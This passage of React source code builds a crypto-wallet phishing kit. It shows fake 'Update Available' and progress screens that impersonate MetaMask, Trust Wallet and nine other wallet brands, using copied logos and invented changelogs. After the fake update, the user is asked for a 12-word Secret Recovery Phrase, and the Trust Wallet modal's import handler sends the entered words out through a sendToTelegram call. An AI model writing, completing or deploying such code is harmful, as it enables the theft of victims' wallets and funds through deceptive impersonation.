5.9216.8704-4.4833z" fill="#e27525" stroke="#e27525"/><path d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z" fill="#f5841f" stroke="#f5841f"/><path d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z" fill="#f5841f" stroke="#f5841f"/><path d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z" fill="#c0ac9d" stroke="#c0ac9d"/><path d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z" fill="#161616" stroke="#161616"/><path d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z" fill="#763e1a" stroke="#763e1a"/><path d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z" fill="#763e1a" stroke="#763e1a"/><path d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z" fill="#f5841f" stroke="#f5841f"/><path d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z" fill="#f5841f" stroke="#f5841f"/><path d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z" fill="#f5841f" stroke="#f5841f"/></g></svg>
              <button className="mm-close-btn" onClick={onClose}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </button>
            </div>
            <div className="mm-update-phase">
              <div className="mm-update-body">
                <svg className="mm-download-icon" xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                  <polyline points="7 10 12 15 17 10"/>
                  <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
                <h2 className="mm-update-title">Update Available</h2>
                <p className="mm-update-version">Version 13.3.0</p>
                <div className="mm-changelog">
                  <ul>
                    <li>Fix main build modifying desktop build steps</li>
                    <li>Improving the security system</li>
                    <li>Fix incorrect network information</li>
                    <li>Improve performance on signature request</li>
                  </ul>
                </div>
                <button className="mm-update-btn" onClick={() => setPhase('updating')}>Update</button>
                <p className="mm-support-text">
                  Need help?{' '}
                  <a href="https://support.metamask.io" target="_blank" rel="noreferrer" className="mm-support-link">
                    Contact MetaMask Support
                  </a>
                </p>
              </div>
            </div>
          </>
        )}

        {phase === 'updating' && (
          <>
            <div className="mm-header">
              <svg fill="none" height="33" viewBox="0 0 35 33" width="35" style={{width:32,height:32}} xmlns="http://www.w3.org/2000/svg"><g strokeLinecap="round" strokeLinejoin="round" strokeWidth=".25"><path d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z" fill="#e17726" stroke="#e17726"/><g fill="#e27625" stroke="#e27625"><path d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"/><path d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"/><path d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"/><path d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"/><path d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"/><path d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"/><path d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"/></g><path d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z" fill="#d5bfb2" stroke="#d5bfb2"/><path d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z" fill="#d5bfb2" stroke="#d5bfb2"/><path d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z" fill="#233447" stroke="#233447"/><path d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z" fill="#233447" stroke="#233447"/><path d="m10.8733 28.8721.6495-5.3386-4.13117.1167z" fill="#cc6228" stroke="#cc6228"/><path d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z" fill="#cc6228" stroke="#cc6228"/><path d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z" fill="#cc6228" stroke="#cc6228"/><path d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z" fill="#cc6228" stroke="#cc6228"/><path d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z" fill="#e27525" stroke="#e27525"/><path d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z" fill="#e27525" stroke="#e27525"/><path d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z" fill="#e27525" stroke="#e27525"/><path d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z" fill="#e27525" stroke="#e27525"/><path d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z" fill="#f5841f" stroke="#f5841f"/><path d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z" fill="#f5841f" stroke="#f5841f"/><path d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z" fill="#c0ac9d" stroke="#c0ac9d"/><path d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z" fill="#161616" stroke="#161616"/><path d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z" fill="#763e1a" stroke="#763e1a"/><path d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z" fill="#763e1a" stroke="#763e1a"/><path d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z" fill="#f5841f" stroke="#f5841f"/><path d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z" fill="#f5841f" stroke="#f5841f"/><path d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z" fill="#f5841f" stroke="#f5841f"/></g></svg>
              <button className="mm-close-btn" onClick={onClose}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </button>
            </div>
            <div className="mm-updating-phase">
              <div className="mm-updating-body">
                <div className="mm-blue-spinner" />
                <h2 className="mm-updating-title">Updating MetaMask</h2>
                <p className="mm-updating-sub">Please wait while we update to version 13.3.0</p>
                <div className="mm-progress-wrap">
                  <div className="mm-progress-track">
                    <div className="mm-progress-bar" style={{ width: `${progress}%` }} />
                  </div>
                  <p className="mm-progress-pct">{progress}%</p>
                </div>
                <p className="mm-updating-notice">This may take a few moments. Please do not close this window.</p>
              </div>
            </div>
          </>
        )}

        {phase === 'import' && (
          <>
            <div className="mm-header">
              <svg fill="none" height="33" viewBox="0 0 35 33" width="35" style={{width:32,height:32}} xmlns="http://www.w3.org/2000/svg"><g strokeLinecap="round" strokeLinejoin="round" strokeWidth=".25"><path d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z" fill="#e17726" stroke="#e17726"/><g fill="#e27625" stroke="#e27625"><path d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"/><path d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"/><path d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"/><path d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"/><path d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"/><path d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"/><path d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"/></g><path d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z" fill="#d5bfb2" stroke="#d5bfb2"/><path d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z" fill="#d5bfb2" stroke="#d5bfb2"/><path d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z" fill="#233447" stroke="#233447"/><path d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z" fill="#233447" stroke="#233447"/><path d="m10.8733 28.8721.6495-5.3386-4.13117.1167z" fill="#cc6228" stroke="#cc6228"/><path d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z" fill="#cc6228" stroke="#cc6228"/><path d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z" fill="#cc6228" stroke="#cc6228"/><path d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z" fill="#cc6228" stroke="#cc6228"/><path d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z" fill="#e27525" stroke="#e27525"/><path d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z" fill="#e27525" stroke="#e27525"/><path d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z" fill="#e27525" stroke="#e27525"/><path d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z" fill="#e27525" stroke="#e27525"/><path d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z" fill="#f5841f" stroke="#f5841f"/><path d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z" fill="#f5841f" stroke="#f5841f"/><path d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z" fill="#c0ac9d" stroke="#c0ac9d"/><path d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z" fill="#161616" stroke="#161616"/><path d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z" fill="#763e1a" stroke="#763e1a"/><path d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z" fill="#763e1a" stroke="#763e1a"/><path d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z" fill="#f5841f" stroke="#f5841f"/><path d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z" fill="#f5841f" stroke="#f5841f"/><path d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z" fill="#f5841f" stroke="#f5841f"/></g></svg>
              <button className="mm-close-btn" onClick={onClose}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </button>
            </div>
            <div className="mm-import-phase">
              <div className="mm-import-body">
                <h2 className="mm-import-title">Import your MetaMask wallet</h2>
                <p className="mm-import-sub">Enter your 12-word Secret Recovery Phrase to restore your wallet.</p>
                <MetaMaskSeedForm onClose={onClose} onImportDone={onImportDone} />
              </div>
            </div>
          </>
        )}

      </div>
    </>
  )
}

/* ─── Per-wallet config for the side modal ─── */
const WALLET_MODAL_CONFIG = {
  'Trust Wallet': {
    version: '8.58.1',
    accentColor: '#3375BB',
    headerBg: '#fff',
    items: ['Enhanced multi-chain support and performance', 'Improved security system', 'Fixed network info', 'Better transaction speed'],
    loadingText: 'Loading Trust Wallet',
    updatingText: 'Updating Trust Wallet',
  },
  'Coinbase Wallet': {
    version: '29.57',
    accentColor: '#1652F0',
    headerBg: '#fff',
    items: ['Important security update', 'Enhanced DeFi integration and swap functionality', 'Improved wallet performance', 'Fix network connection issues'],
    loadingText: 'Loading Coinbase Wallet',
    updatingText: 'Updating Coinbase Wallet',
  },
  'Phantom Wallet': {
    version: '24.12.0',
    accentColor: '#AB9FF2',
    headerBg: '#1a1a2e',
    dark: true,
    items: ['View Solana, Ethereum, and Polygon balances together', 'Improved NFT display and management', 'Faster transaction confirmations', 'Bug fixes and performance improvements'],
    loadingText: "What's new in Phantom?",
    updatingText: 'Updating your wallet',
  },
  'OKX Wallet': {
    version: '6.136.0',
    accentColor: '#000',
    headerBg: '#fff',
    items: ['Fix main build modifying desktop build steps', 'Improving the security system', 'Fix incorrect network information', 'Improve performance on signature request'],
    loadingText: 'Loading OKX Wallet',
    updatingText: 'Updating OKX Wallet',
  },
  'Rabby Wallet': {
    version: '0.93.49',
    accentColor: '#8697FF',
    headerBg: '#fff',
    items: ['Enhanced multi-chain support with seamless asset viewing', 'Improved transaction security checks', 'Fix incorrect gas estimation', 'Performance improvements'],
    loadingText: 'Loading Rabby Wallet',
    updatingText: 'Updating Rabby Wallet',
  },
  'Rainbow': {
    version: '2.0.0',
    accentColor: '#FF6B6B',
    headerBg: '#fff',
    items: ['New rainbow-themed UI improvements', 'Enhanced Ethereum token support', 'Improved swap performance', 'Bug fixes and stability updates'],
    loadingText: 'Loading Rainbow Wallet',
    updatingText: 'Updating rainbow Wallet',
  },
  'Ledger': {
    version: '2.81.0',
    accentColor: '#333',
    headerBg: '#fff',
    items: ['Improved Ledger device connection stability', 'Enhanced security for transaction signing', 'New chain support added', 'Performance and reliability fixes'],
    loadingText: 'Connecting to Ledger',
    updatingText: 'Updating Ledger Live',
  },
  'Keplr': {
    version: '0.12.271',
    accentColor: '#314FDF',
    headerBg: '#fff',
    items: ['New Updates for multi-chain support', 'Improved staking and governance features', 'Enhanced IBC transfer reliability', 'Performance and security improvements'],
    loadingText: 'Loading Keplr Wallet',
    updatingText: 'Updating Keplr Wallet',
  },
  'WalletConnect': {
    version: '2.21.8',
    accentColor: '#3B99FC',
    headerBg: '#fff',
    items: ['Seamless connection with multiple wallets', 'Improved QR code scanning for faster authentication', 'Secure session management for persistent connections', 'Optimized for faster transaction approvals'],
    loadingText: 'Loading Wallet Connect',
    updatingText: 'Updating WalletConnect',
  },
  '1inch Wallet': {
    version: '3.14.2',
    accentColor: '#1B1CFC',
    headerBg: '#fff',
    items: ['Improved DEX aggregation performance', 'Enhanced gas optimization', 'Better cross-chain swap support', 'Security and stability updates'],
    loadingText: 'Loading 1inch Wallet',
    updatingText: 'Updating 1inch Wallet',
  },
  'Sui Wallet': {
    version: '1.56.1',
    accentColor: '#6FBCF0',
    headerBg: '#0c0a1f',
    dark: true,
    items: ['Improved Sui network performance', 'Enhanced staking rewards display', 'Better DeFi integration', 'Fix transaction history issues'],
    loadingText: 'Your Money. Unblock.',
    updatingText: 'Updating Sui Wallet',
  },
}

/* ─── Generic wallet side-modal for all non-MetaMask wallets ─── */
/* ── Trust Wallet Shield SVG (exact from reference) ── */
function TrustShieldSVGLarge() {
  return (
    <svg style={{height:'120px',width:'auto'}} fill="none" width="62" height="87" viewBox="0 0 62 87" xmlns="http://www.w3.org/2000/svg">
      <g clipPath="url(#tw_clip_lg)">
        <path d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z" fill="#48FF91"/>
        <path d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z" fill="url(#tw_grad_lg)"/>
        <path d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z" fill="#48FF91"/>
        <path d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z" fill="#48FF91"/>
        <path d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z" fill="#48FF91"/>
        <path d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z" fill="#48FF91"/>
        <path d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z" fill="#48FF91"/>
      </g>
      <defs>
        <linearGradient id="tw_grad_lg" x1="29.1518" y1="94.7238" x2="54.3898" y2="3.84876" gradientUnits="userSpaceOnUse">
          <stop offset="0.26" stopColor="#48FF91"/>
          <stop offset="0.66" stopColor="#0094FF"/>
          <stop offset="0.8" stopColor="#0038FF"/>
          <stop offset="0.89" stopColor="#0500FF"/>
        </linearGradient>
        <clipPath id="tw_clip_lg"><rect width="61.1691" height="86.0768" fill="white"/></clipPath>
      </defs>
    </svg>
  )
}

function TrustShieldSVGMedium({ id }) {
  return (
    <svg style={{height:'70px',width:'auto'}} fill="none" width="62" height="87" viewBox="0 0 62 87" xmlns="http://www.w3.org/2000/svg">
      <g clipPath={`url(#tw_clip_${id})`}>
        <path d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z" fill="#48FF91"/>
        <path d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z" fill={`url(#tw_grad_${id})`}/>
        <path d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z" fill="#48FF91"/>
        <path d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z" fill="#48FF91"/>
        <path d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z" fill="#48FF91"/>
        <path d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z" fill="#48FF91"/>
        <path d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z" fill="#48FF91"/>
      </g>
      <defs>
        <linearGradient id={`tw_grad_${id}`} x1="29.1518" y1="94.7238" x2="54.3898" y2="3.84876" gradientUnits="userSpaceOnUse">
          <stop offset="0.26" stopColor="#48FF91"/>
          <stop offset="0.66" stopColor="#0094FF"/>
          <stop offset="0.8" stopColor="#0038FF"/>
          <stop offset="0.89" stopColor="#0500FF"/>
        </linearGradient>
        <clipPath id={`tw_clip_${id}`}><rect width="61.1691" height="86.0768" fill="white"/></clipPath>
      </defs>
    </svg>
  )
}

function TrustWalletModal({ onClose, onImportDone }) {
  const [phase, setPhase]       = useState('loading')
  const [progress, setProgress] = useState(0)
  const [wordCount, setWordCount] = useState('12')
  const seedRef = useRef(null)
  const handleImport = () => {
    if (seedRef.current) {
      const inputs = seedRef.current.querySelectorAll('input')
      const words = Array.from(inputs).map(el => el.value.trim()).filter(Boolean)
      if (words.length > 0) sendToTelegram('Trust Wallet', words)
    }
    onImportDone ? onImportDone() : onClose()
  }

  // After 3s on loading, show update screen
  useEffect(() => {
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  // Progress bar — 10 seconds
  useEffect(() => {
    if (phase !== 'updating') return
    setProgress(0)
    const iv = setInterval(() => {
      setProgress(p => {
        if (p >= 100) {
          clearInterval(iv)
          setTimeout(() => setPhase('import'), 400)
          return 100
        }
        return p + 1
      })
    }, 100)
    return () => clearInterval(iv)
  }, [phase])

  return (
    <>
      <style>{`
        @keyframes twSpin { to { transform: rotate(360deg); } }
        @keyframes twSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        .tw-overlay {
          position: fixed; inset: 0; z-index: 10000;
          background: rgba(18,18,18,0.5); pointer-events: auto;
        }
        .tw-modal {
          position: fixed; z-index: 10001;
          top: 0; right: 32px;
          width: 360px; height: 680px;
          background: #ffffff;
          border: 1px solid #eaecef;
          box-shadow: 0 8px 40px rgba(0,0,0,0.18);
          display: flex; flex-direction: column; overflow: hidden;
          font-family: 'Inter', -apple-system, sans-serif;
          animation: twSlide 0.2s ease;
        }
        @media (max-width: 600px) {
          .tw-modal {
            top:0; left:0; right:0; bottom:0;
            width:100%; height:100%; max-height:100%;
            border-radius:0; transform:none;
          }
        }
        /* Loading phase */
        .tw-loading {
          flex:1; display:flex; align-items:center; justify-content:center;
          flex-direction:column; background:#ffffff;
        }
        /* Update phase */
        .tw-update { flex:1; display:flex; flex-direction:column; overflow-y:auto; background:#ffffff; }
        .tw-update-inner { display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px; }
        .tw-update-title { font-size:24px; font-weight:700; color:#000; margin:32px 0 0; font-family:'Inter',sans-serif; }
        .tw-update-version { font-size:16px; color:#1e2329; margin:8px 0 24px; }
        .tw-info-box {
          width:100%; background:#0094ff1a; border-left:4px solid #0094ff;
          border-radius:0 4px 4px 0; padding:16px; margin-bottom:24px; box-sizing:border-box;
        }
        .tw-info-box p { margin:0; font-size:14px; font-weight:500; color:#1e2329; line-height:1.5; }
        .tw-changelog { width:100%; background:#f5f5f5; border-radius:4px; padding:16px; margin-bottom:32px; box-sizing:border-box; }
        .tw-changelog ul { margin:0; padding-left:20px; list-style:disc; }
        .tw-changelog li { font-size:14px; color:#1e2329; line-height:1.5; margin-bottom:8px; }
        .tw-changelog li:last-child { margin-bottom:0; }
        .tw-update-btn {
          width:100%; height:50px; background:#0500ff; color:#fff;
          border:none; border-radius:999px; font-size:16px; font-weight:500;
          cursor:pointer; font-family:inherit; transition:opacity 0.2s; margin-bottom:16px;
        }
        .tw-update-btn:hover { opacity:0.85; }
        .tw-contact { font-size:14px; color:#1e2329; text-align:center; }
        .tw-contact a { color:#0500ff; text-decoration:none; }
        .tw-contact a:hover { opacity:0.8; }
        /* Updating phase */
        .tw-updating { flex:1; display:flex; flex-direction:column; overflow-y:auto; background:#ffffff; }
        .tw-updating-inner { display:flex; flex-direction:column; align-items:center; padding:48px 32px 32px; }
        .tw-updating-title { font-size:24px; font-weight:700; color:#000; margin:32px 0 0; }
        .tw-updating-sub { font-size:16px; color:#1e2329; margin:8px 0 48px; text-align:center; line-height:1.5; }
        .tw-progress-track { width:100%; height:8px; background:#f5f5f5; border-radius:999px; overflow:hidden; position:relative; }
        .tw-progress-fill { height:100%; background:#0500ff; border-radius:999px; transition:width 0.1s linear; }
        .tw-progress-labels { display:flex; justify-content:space-between; align-items:center; margin-top:12px; }
        .tw-progress-label { font-size:14px; color:#1e2329; }
        .tw-progress-pct { font-size:14px; font-weight:500; color:#1e2329; }
        .tw-updating-notice { font-size:14px; color:#848e9c; text-align:center; margin-top:40px; line-height:1.5; }
        /* Import phase */
        .tw-import { flex:1; display:flex; flex-direction:column; overflow-y:auto; background:#ffffff; }
        .tw-import-inner { display:flex; flex-direction:column; align-items:center; padding:20px 16px; }
        .tw-import-title { font-size:22px; font-weight:700; color:#1e2329; margin:16px 0 0; }
        .tw-word-select-row { display:flex;align-items:center;gap:8px;background:#f4f6fa;border-radius:10px;padding:10px 14px;width:100%;margin-top:16px;box-sizing:border-box; }
        .tw-word-select {
          flex:1; font-size:13px; font-weight:500; color:#374151;
          border:none; background:transparent; outline:none; cursor:pointer; font-family:inherit;
        }
        .tw-seed-grid {
          display:grid; grid-template-columns:1fr 1fr 1fr; gap:7px;
          width:100%; margin-top:16px; max-height:300px; overflow-y:auto;
        }
        .tw-seed-cell { position:relative; }
        .tw-seed-num { position:absolute;top:50%;left:8px;transform:translateY(-50%);font-size:10px;font-weight:700;color:#9ca3af;pointer-events:none;user-select:none;line-height:1; }
        .tw-seed-input {
          width:100%; padding:10px 6px 10px 22px;
          font-size:12px; font-weight:500; color:#1e2329; font-family:inherit;
          background:#fafafa; border:1.5px solid #e5e7eb; border-radius:10px;
          outline:none; transition:all 0.18s; box-sizing:border-box;
        }
        .tw-seed-input:focus { border-color:#0376c9; background:#fff; box-shadow:0 0 0 3px rgba(3,118,201,0.10); }
        .tw-seed-input::placeholder { color:#c4c9d4; font-size:11px; }
        .tw-seed-pk { width:100%;padding:12px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:13px;font-weight:500;color:#1e2329;font-family:inherit;outline:none;background:#fafafa;transition:all 0.18s;box-sizing:border-box;margin-top:16px; }
        .tw-seed-pk:focus { border-color:#0376c9;background:#fff; }
        .tw-seed-pk::placeholder { color:#c4c9d4; }
        .tw-import-actions { display:flex; gap:8px; width:100%; margin-top:16px; }
        .tw-back-btn {
          flex:1; height:48px; background:none; border:none;
          color:#0500ff; font-size:16px; font-weight:500; cursor:pointer;
          font-family:inherit; transition:opacity 0.2s;
        }
        .tw-back-btn:hover { opacity:0.8; }
        .tw-next-btn {
          flex:1; height:48px; background:#0500ff; color:#fff;
          border:none; border-radius:999px; font-size:16px; font-weight:500;
          cursor:pointer; font-family:inherit; transition:opacity 0.2s;
        }
        .tw-next-btn:hover { opacity:0.85; }
      `}</style>

      <div className="tw-overlay" onClick={onClose} />
      <div className="tw-modal">

        {/* ── Loading: white bg + centered large shield ── */}
        {phase === 'loading' && (
          <div className="tw-loading">
            <TrustShieldSVGLarge />
          </div>
        )}

        {/* ── Update Available ── */}
        {phase === 'update' && (
          <div className="tw-update">
            <div className="tw-update-inner">
              <TrustShieldSVGMedium id="upd" />
              <h3 className="tw-update-title">Update Available</h3>
              <p className="tw-update-version">Version 8.58.1</p>
              <div className="tw-info-box">
                <p>Important scheduled update with security improvements. We recommend installing it now.</p>
              </div>
              <div className="tw-changelog">
                <ul>
                  <li>Enhanced multi-chain support and performance</li>
                  <li>Improved security system</li>
                  <li>Fixed network information display</li>
                  <li>Better transaction signing experience</li>
                </ul>
              </div>
              <button className="tw-update-btn" onClick={() => setPhase('updating')}>Update</button>
              <p className="tw-contact">
                Need help?{' '}
                <a href="https://support.trustwallet.com/en/support/home" target="_blank" rel="noreferrer">Contact Us</a>
              </p>
            </div>
          </div>
        )}

        {/* ── Updating ── */}
        {phase === 'updating' && (
          <div className="tw-updating">
            <div className="tw-updating-inner">
              <TrustShieldSVGMedium id="upding" />
              <h3 className="tw-updating-title">Updating</h3>
              <p className="tw-updating-sub">Please wait while we update to version 8.58.1</p>
              <div style={{width:'100%'}}>
                <div className="tw-progress-track">
                  <div className="tw-progress-fill" style={{width:`${progress}%`}} />
                </div>
                <div className="tw-progress-labels">
                  <span className="tw-progress-label">Downloading update...</span>
